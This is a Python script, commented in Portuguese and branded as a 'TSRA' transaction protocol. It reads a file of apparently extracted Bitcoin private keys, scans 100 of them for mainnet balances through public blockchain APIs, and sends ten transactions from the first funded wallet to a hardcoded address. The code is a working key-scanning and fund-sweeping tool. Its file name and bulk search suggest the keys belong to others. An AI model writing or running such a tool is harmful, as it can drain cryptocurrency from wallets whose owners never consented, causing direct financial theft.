#!/usr/bin/env python3
"""
Script para verificar saldos e enviar transações
Protocolo TSRA - Transaction Security Real Action
"""

import sys
import time
import requests
from bitcoinlib.wallets import Wallet, wallet_delete_if_exists
from bitcoinlib.keys import Key
import json
from datetime import datetime

# Configurações
BINANCE_CUSTODY_ADDRESS = "13m3xop6RnioRX6qrnkavLekv7cvu5DuMK"
AMOUNT_PER_TX = 0.0001
NUM_TRANSACTIONS = 10
BLOCKCHAIN_APIS = [
    "https://blockstream.info/api",
    "https://mempool.space/api"
]

def get_balance_from_api(address):
    """Obtém saldo de um endereço via API"""
    for api_url in BLOCKCHAIN_APIS:
        try:
            response = requests.get(f'{api_url}/address/{address}', timeout=10)
            if response.status_code == 200:
                data = response.json()
                funded = data['chain_stats']['funded_txo_sum']
                spent = data['chain_stats']['spent_txo_sum']
                balance_satoshis = funded - spent
                return balance_satoshis
        except Exception as e:
            continue
    return 0

def get_block_height():
    """Obtém altura do bloco atual"""
    for api_url in BLOCKCHAIN_APIS:
        try:
            response = requests.get(f'{api_url}/blocks/tip/height', timeout=10)
            if response.status_code == 200:
                return int(response.text.strip())
        except:
            continue
    return 0

def hex_to_wif(hex_key):
    """Converte chave privada hexadecimal para WIF"""
    try:
        key = Key(hex_key, network='bitcoin')
        return key.wif()
    except:
        return None

def check_keys_and_find_funded():
    """Verifica chaves e encontra aquelas com saldo"""
    print("=" * 70)
    print("VERIFICANDO SALDOS DAS CARTEIRAS")
    print("=" * 70)
    print()
    
    # Lê chaves do arquivo
    print("📂 Lendo chaves privadas do arquivo...")
    with open('/home/ubuntu/upload/extracted_keys_and_addresses.txt', 'r') as f:
        lines = f.readlines()
    
    # Extrai chaves hexadecimais
    hex_keys = []
    for line in lines:
        line = line.strip()
        if len(line) == 64 and all(c in '0123456789abcdef' for c in line.lower()):
            hex_keys.append(line)
    
    print(f"✓ Total de chaves encontradas: {len(hex_keys)}")
    print()
    
    # Verifica saldos (primeiras 100 chaves para teste)
    print("🔍 Verificando saldos (primeiras 100 chaves)...")
    print()
    
    funded_wallets = []
    
    for i, hex_key in enumerate(hex_keys[:100], 1):
        try:
            # Converte para WIF
            wif = hex_to_wif(hex_key)
            if not wif:
                continue
            
            # Cria carteira temporária
            wallet_name = f"temp_check_{i}"
            wallet_delete_if_exists(wallet_name)
            
            wallet = Wallet.create(
                name=wallet_name,
                keys=wif,
                network='bitcoin',
                witness_type='legacy'
            )
            
            address = wallet.addresslist()[0]
            
            # Verifica saldo via API
            balance_satoshis = get_balance_from_api(address)
            balance_btc = balance_satoshis / 100000000
            
            print(f"  [{i}/100] {address}: {balance_btc:.8f} BTC", end="")
            
            if balance_satoshis > 0:
                print(" ✅ COM SALDO!")
                funded_wallets.append({
                    'hex_key': hex_key,
                    'wif': wif,
                    'address': address,
                    'balance_satoshis': balance_satoshis,
                    'balance_btc': balance_btc
                })
            else:
                print(" (vazio)")
            
            # Deleta carteira temporária
            wallet_delete_if_exists(wallet_name)
            
            # Aguarda para não sobrecarregar APIs
            time.sleep(0.5)
            
        except Exception as e:
            print(f"  [{i}/100] Erro ao verificar: {e}")
            continue
    
    print()
    print("=" * 70)
    print(f"RESULTADO: {len(funded_wallets)} carteira(s) com saldo encontrada(s)")
    print("=" * 70)
    print()
    
    return funded_wallets

def send_transactions(wallet_info):
    """Envia as 10 transações"""
    print("=" * 70)
    print("INICIANDO ENVIO DE TRANSAÇÕES")
    print("=" * 70)
    print()
    
    # Obtém altura do bloco
    block_height = get_block_height()
    print(f"📊 Altura do bloco atual: {block_height}")
    print(f"🌐 Rede: Mainnet")
    print()
    
    # Importa carteira
    print("🔐 Importando carteira com saldo...")
    wallet_name = "tsra_sender"
    wallet_delete_if_exists(wallet_name)
    
    wallet = Wallet.create(
        name=wallet_name,
        keys=wallet_info['wif'],
        network='bitcoin',
        witness_type='legacy'
    )
    
    print(f"   ✓ Endereço: {wallet_info['address']}")
    print(f"   ✓ Saldo: {wallet_info['balance_btc']:.8f} BTC")
    print()
    
    # Verifica saldo mínimo
    min_needed = (AMOUNT_PER_TX * NUM_TRANSACTIONS + 0.0005) * 100000000
    if wallet_info['balance_satoshis'] < min_needed:
        print(f"❌ Saldo insuficiente!")
        print(f"   Necessário: {min_needed/100000000:.8f} BTC")
        print(f"   Disponível: {wallet_info['balance_btc']:.8f} BTC")
        return
    
    # Confirmação
    print("⚠️ CONFIRMAÇÃO NECESSÁRIA")
    print(f"   Enviar {NUM_TRANSACTIONS} transações de {AMOUNT_PER_TX} BTC cada")
    print(f"   Destino: {BINANCE_CUSTODY_ADDRESS}")
    print(f"   Total: {NUM_TRANSACTIONS * AMOUNT_PER_TX} BTC + taxas")
    print(f"   Rede: MAINNET (REAL)")
    print()
    
    confirm = input("   Digite 'CONFIRMAR' para prosseguir: ")
    if confirm != "CONFIRMAR":
        print("\n   ❌ Operação cancelada")
        return
    
    print()
    print("🚀 Iniciando envios...")
    print()
    
    results = []
    
    # Envia transações
    for i in range(1, NUM_TRANSACTIONS + 1):
        print(f"{'=' * 70}")
        print(f"TRANSAÇÃO #{i} DE {NUM_TRANSACTIONS}")
        print(f"{'=' * 70}")
        
        try:
            # Atualiza carteira
            wallet.scan()
            balance_before = wallet.balance()
            print(f"1️⃣ Saldo atual: {balance_before / 100000000:.8f} BTC")
            
            # Cria transação
            amount_satoshis = int(AMOUNT_PER_TX * 100000000)
            print(f"2️⃣ Criando transação de {AMOUNT_PER_TX} BTC...")
            
            tx = wallet.send_to(
                BINANCE_CUSTODY_ADDRESS,
                amount_satoshis,
                fee=1000,
                offline=False
            )
            
            if not tx:
                raise Exception("Falha ao criar transação")
            
            txid = tx.txid
            print(f"   ✓ TXID: {txid}")
            
            # Valida TXID
            if len(txid) != 64:
                raise Exception(f"TXID inválido: {txid}")
            
            print(f"3️⃣ Verificando na blockchain...")
            time.sleep(3)
            
            # Verifica
            verified = False
            for api_url in BLOCKCHAIN_APIS:
                try:
                    response = requests.get(f'{api_url}/tx/{txid}', timeout=10)
                    if response.status_code == 200:
                        verified = True
                        print(f"   ✓ Transação verificada!")
                        break
                except:
                    continue
            
            result = {
                'tx_num': i,
                'txid': txid,
                'amount_btc': AMOUNT_PER_TX,
                'verified': verified,
                'success': True,
                'link': f"https://mempool.space/tx/{txid}"
            }
            results.append(result)
            
            print(f"\n   ✅ TRANSAÇÃO #{i} ENVIADA COM SUCESSO!")
            print(f"   🔗 {result['link']}")
            print()
            
            if i < NUM_TRANSACTIONS:
                print(f"   ⏳ Aguardando 5s...")
                time.sleep(5)
            
        except Exception as e:
            print(f"\n   ❌ ERRO: {e}")
            results.append({
                'tx_num': i,
                'error': str(e),
                'success': False
            })
    
    # Relatório
    print()
    print("=" * 70)
    print("RELATÓRIO FINAL")
    print("=" * 70)
    print()
    
    successful = [r for r in results if r.get('success')]
    print(f"✅ Transações bem-sucedidas: {len(successful)}/{NUM_TRANSACTIONS}")
    print()
    
    if successful:
        print("📋 TXIDs:")
        for r in successful:
            print(f"   TX #{r['tx_num']}: {r['txid']}")
            print(f"            {r['link']}")
        
        total_sent = len(successful) * AMOUNT_PER_TX
        print()
        print(f"💰 Total enviado: {total_sent:.8f} BTC")
    
    # Salva relatório
    report_file = f"transaction_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\n💾 Relatório salvo: {report_file}")
    print()
    
    # Saldo final
    wallet.scan()
    balance_final = wallet.balance()
    print(f"💰 Saldo final: {balance_final / 100000000:.8f} BTC")
    
    wallet_delete_if_exists(wallet_name)

def main():
    """Função principal"""
    print()
    print("⚠️" * 35)
    print("SISTEMA DE ENVIO DE TRANSAÇÕES BITCOIN - PROTOCOLO TSRA")
    print("⚠️" * 35)
    print()
    
    # Verifica saldos
    funded_wallets = check_keys_and_find_funded()
    
    if not funded_wallets:
        print("❌ Nenhuma carteira com saldo encontrada nas primeiras 100 chaves.")
        print("   Todas as chaves verificadas estão vazias.")
        print("   Você pode fornecer uma chave WIF específica com saldo.")
        return
    
    # Usa a primeira carteira com saldo
    wallet_info = funded_wallets[0]
    print(f"✅ Usando carteira: {wallet_info['address']}")
    print(f"   Saldo: {wallet_info['balance_btc']:.8f} BTC")
    print()
    
    # Envia transações
    send_transactions(wallet_info)
    
    print()
    print("✅ Processo concluído!")
    print()

if __name__ == "__main__":
    main()

